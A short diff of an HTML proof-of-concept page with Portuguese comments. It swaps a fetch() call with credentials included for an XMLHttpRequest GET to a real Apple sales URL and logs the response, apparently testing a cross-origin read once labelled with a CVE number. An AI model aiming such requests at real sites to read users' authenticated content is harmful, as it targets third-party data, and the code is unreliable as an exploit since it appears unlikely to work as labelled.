@@ -1,31 +1,35 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CVE-2008-7220 PoC - Requisição Direta</title>
+    <title>XMLHttpRequest PoC</title>
 </head>
 <body>
-    <h1>CVE-2008-7220 PoC - Requisição Direta</h1>
+    <h1>XMLHttpRequest PoC</h1>
 
     <script>
         // Função para fazer a requisição e exibir o conteúdo no console
         function fetchPageContent() {
-            fetch('https://sales.apple.com/home', {
-                method: 'GET',
-                credentials: 'include' // Inclui cookies se necessário
-            })
-            .then(response => {
-                if (response.ok) {
-                    return response.text(); // Obtém o conteúdo da resposta como texto
+            var xhr = new XMLHttpRequest();
+            var url = 'https://sales.apple.com/home'; // URL do destino
+
+            xhr.open('GET', url, true); // Configura a requisição GET
+
+            // Define o que fazer quando a requisição for completada
+            xhr.onload = function() {
+                if (xhr.status >= 200 && xhr.status < 300) {
+                    console.log(xhr.responseText); // Exibe o conteúdo da resposta no console
                 } else {
-                    throw new Error('Falha na requisição: ' + response.status);
+                    console.log('Falha na requisição: ' + xhr.status);
                 }
-            })
-            .then(text => {
-                console.log(text); // Exibe o conteúdo no console
-            })
-            .catch(error => {
-                console.error('Erro:', error); // Exibe erros no console
-            });
+            };
+
+            // Define o que fazer se a requisição falhar
+            xhr.onerror = function() {
+                console.log('Erro na requisição.');
+            };
+
+            // Envia a requisição
+            xhr.send();
         }
 
         // Executa a função para buscar o conteúdo da página
